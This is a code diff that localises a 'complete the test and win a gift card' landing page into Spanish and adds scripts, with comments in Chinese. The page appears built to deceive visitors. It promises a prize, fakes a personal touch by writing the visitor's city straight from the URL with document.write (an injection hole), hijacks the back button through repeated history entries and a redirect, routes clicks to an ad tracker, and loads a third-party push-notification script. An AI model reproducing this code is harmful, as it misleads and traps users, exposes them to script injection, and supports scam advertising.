@@ -4,7 +4,7 @@
 	<meta name="pushsdk" content="74b464bda8feaa68475ab3ad874de656">
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<title>Kumpletuhin ang pagsubok!</title>
+	<title>¡Completa la prueba!</title>
 	<link rel="stylesheet" href="style.css">
 	<script>
 	function getURLParameter(name) {
@@ -18,20 +18,20 @@
 
 	<div class="main">
 		
-		<h1>Complete the test in the next <span class="timer" id="timer"></span> seconds</h1>
+		<h1>Complete la prueba en el siguiente<span class="timer" id="timer"></span>segundos</h1>
 
 		<p><img src="gift_card.jpg" class="image"></p>
 
-		<h2>and see if you win a GIFT CARD!</h2>
+		<h2>y mira si ganas una TARJETA DE REGALO!</h2>
 
 		<p class="text-left list-text">
-			1. Answer a few simple questions<br>
-			2. You will see your results immediately<br>
-			3. Check if you won a GIFT CARD!
+			1. Responda algunas preguntas simples<br>
+			2. Verás tus resultados inmediatamente<br>
+			3. ¡Compruebe si ganó una TARJETA DE REGALO!
 		</p>
-		<p><a href="YOUR_CLICK_URL_HERE" class="cta-button">PLAY NOW!</a></p>
-		<p>you live in the city of <script>document.write(getURLParameter('city'))</script></p>
-		<button onclick="go();">CLICK ME</button>
+		<p><a  onclick="go();"class="cta-button">HAZ CLICK EN MI</button></a></p>
+		<p>vives en la ciudad de <script>document.write(getURLParameter('city'))</script></p>
+		
 	</div>
 	
 
@@ -79,8 +79,17 @@
 			}
 	</script>
 	<script>
+		function getURLParameter(name) {
+			return decodeURIComponent(
+				(RegExp(name + "=" + "(.+?)(&|$)").exec(location.search) || [,		/*添加 JS 函数以获取 URL 参数*/
+					null
+				])[1] || ""
+			);
+		}
+	</script>
+	<script>
 		var camp_id = getURLParameter("campaign_id");
-		var lp_name = getURLParameter("landing_page_title");
+		var lp_name = getURLParameter("landing_page_title");			/*为令牌添加变量*/
 		console.log(
 			`The campaign ID is: ${
 				camp_id || null
@@ -94,7 +103,7 @@
 			var t;
 			try {
 				const URL = window.location.href.split(/[#]/)[0];
-				for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + "#");
+				for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + "#");		/*后退脚本*/
 				onpopstate = function(event) {
 					event.state && location.replace(back_url);
 				};
@@ -103,6 +112,12 @@
 			}
 		})();
 	</script>
+	<script>
+		function go() {
+			window.onbeforeunload = null;
+			window.location = 'https://o35pg.bemobtrcks.com/click';		/*机器识别*/
+		}
+		</script>
 	<script>
 		var s = document.createElement('script');
 		s.src='//lemouwee.com/pfe/current/micro.tag.min.js?z=5946956'+'&sw=/sw-check-permissions-a7046.js';
